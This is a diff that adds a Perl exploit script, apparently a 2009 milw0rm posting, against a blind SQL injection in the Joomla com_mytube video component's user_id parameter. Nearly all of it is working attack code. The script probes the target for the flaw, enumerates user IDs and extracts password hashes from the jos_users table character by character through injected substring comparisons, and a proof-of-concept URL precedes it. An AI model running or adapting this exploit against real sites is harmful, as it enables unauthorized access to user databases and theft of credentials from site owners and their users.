@@ -1,0 +1,166 @@
+#!/usr/bin/perl -w
+
+#---------------------------------------------------------------------------------
+#joomla component com_mytube (user_id) Blind SQL Injection Vulnerability
+#---------------------------------------------------------------------------------
+
+#Author         : Chip D3 Bi0s
+#Group          : LatiHackTeam
+#Email          : chipdebios[alt+64]gmail.com
+#Date           : 15 September 2009
+#Critical Lvl   : Moderate
+#Impact	        : Exposure of sensitive information
+#Where	        : From Remote
+#---------------------------------------------------------------------------
+
+#Affected software description:
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+#Application   : MyRemote Video Gallery
+#version       : 1.0 Beta 
+#Developer     : Jomtube Team
+#License       : GPL            type  : Non-Commercial
+#Date Added    : Aug 24, 2009
+#Download      : http://joomlacode.org/gf/download/frsrelease/10834/42943/com_mytube_1.0.0_2009.08.02.zip
+#Description   :
+
+#MyRemote Video Gallery is the most Powerful Video Extension made for Joomla 1.5x
+#which will allow you to transform your Website into a professional looking Video
+#Gallery with functionality that is similar to YouTube.com. MyRemote Video Gallery
+#is an open source (GNU GPL) video sharing Joomla extension has been created
+#specifically for the Joomla 1.5x (MVC) Framework and can not be used without Joomla.
+
+#MyRemote Video Gallery gives you the option to Embed Videos from Youtube and offers
+#the Framework so you can create your own Remote Plugins for other Remote Servers like
+#Dailymotion, Google Video, Vimeo, Blip.tv, Clipser, Revver, a which will allow you to
+#run your site for low cost since all the bandwidth usage and hard drive space is located
+#on the video server sites. So if you already have a large library of Videos on some
+#Remote Sites like Youtube.com you can build the Video Part of your Site Very Quickly.
+
+#---------------------------------------------------------------------------
+
+
+#I.Blind SQL injection (user_id)
+#Poc/Exploit:
+#~~~~~~~~~~~
+#http://127.0.0.1/[path]/index.php?view=videos&type=member&user_id=X[blind]&option=com_mytube&Itemid=null
+#X: Valid User_id
+
+#+++++++++++++++++++++++++++++++++++++++
+#[!] Produced in South America
+#+++++++++++++++++++++++++++++++++++++++
+
+
+use LWP::UserAgent;
+use Benchmark;
+my $t1 = new Benchmark;
+
+system ('cls');
+print "\n\n";
+print "\t\t[+] ---------------------------------[+]\n";
+print "\t\t|          |  Chip d3 Bi0s |          |\n";
+print "\t\t|        MyRemote Video Gallery Bsql  | \n";
+print "\t\t|joomla component com_mytube (user_id)| \n";
+print "\t\t[+]----------------------------------[+]\n\n";
+
+
+print "http://127.0.0.1/[path]/index.php?view=videos&type=member&user_id=62:\n";chomp(my $target=<STDIN>);
+
+$w="Total Videos In Category";
+$column_name="concat(password)";
+$table_name="jos_users";
+
+
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+
+print "----------------Inyectando----------------\n";
+
+
+  $host = $target . "+and+1=1&option=com_mytube&Itemid=null";
+  my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;
+  if ($content =~ /$regexp/) {
+
+$host = $target . "+and+1=2&option=com_mytube&Itemid=null";
+  my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;
+  if ($content =~ /$regexp/) {print " [-] Exploit Fallo :(\n";}
+
+else
+
+{print " [-] Vulnerable :)\n";
+
+$d=0;
+
+
+for ($idusuario=62;$idusuario<=80;$idusuario++) 
+
+{
+                    
+ $host = $target . "+and+ascii(substring((SELECT+".$column_name."+from+".$table_name."+where+id=".$idusuario."+limit+0,1),1,1))>0&option=com_mytube&Itemid=null";
+ my $res = $b->request(HTTP::Request->new(GET=>$host));
+ my $content = $res->content;
+ my $regexp = $w;
+ if ($content =~ /$regexp/) {$idusu[$d]=$idusuario;$d=$d+1}
+
+ }
+
+ print " [+] Usuario existentes : "." ".join(',', @idusu) . "\n";
+
+print  " [-] # Usuario que desea extraer : ";chomp($iduss=<STDIN>);
+
+for ($x=1;$x<=32;$x++) 
+	{
+
+  $host = $target . "+and+ascii(substring((SELECT+".$column_name."+from+".$table_name."+where+id=".$iduss."+limit+0,1),".$x.",1))>57&option=com_mytube&Itemid=null";
+  my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;
+  print " [!] ";if($x <= 9 ) {print "0$x";}else{print $x;}
+  if ($content =~ /$regexp/)
+  {
+  
+          for ($c=97;$c<=102;$c++) 
+
+{
+ $host = $target . "+and+ascii(substring((SELECT+".$column_name."+from+".$table_name."+where+id=".$iduss."+limit+0,1),".$x.",1))=".$c."&option=com_mytube&Itemid=null";
+ my $res = $b->request(HTTP::Request->new(GET=>$host));
+ my $content = $res->content;
+ my $regexp = $w;
+
+
+ if ($content =~ /$regexp/) {$char=chr($c); $caracter[$x-1]=chr($c); print "-Caracter: $char\n"; $c=102;}
+ }
+
+
+  }
+else
+{
+
+for ($c=48;$c<=57;$c++) 
+
+{
+ $host = $target . "+and+ascii(substring((SELECT+".$column_name."+from+".$table_name."+where+id=".$iduss."+limit+0,1),".$x.",1))=".$c."&option=com_mytube&Itemid=null";
+ my $res = $b->request(HTTP::Request->new(GET=>$host));
+ my $content = $res->content;
+ my $regexp = $w;
+
+ if ($content =~ /$regexp/) {$char=chr($c); $caracter[$x-1]=chr($c); print "-Caracter: $char\n"; $c=57;}
+ }
+
+
+}
+
+	}
+
+print " [+] Password   :"." ".join('', @caracter) . "\n";
+
+my $t2 = new Benchmark;
+my $tt = timediff($t2, $t1);
+print "El script tomo:",timestr($tt),"\n";
+
+}
+}
+
+else
+
+{print " [-] Exploit Fallo :(\n";}
+
+# milw0rm.com [2009-09-21]
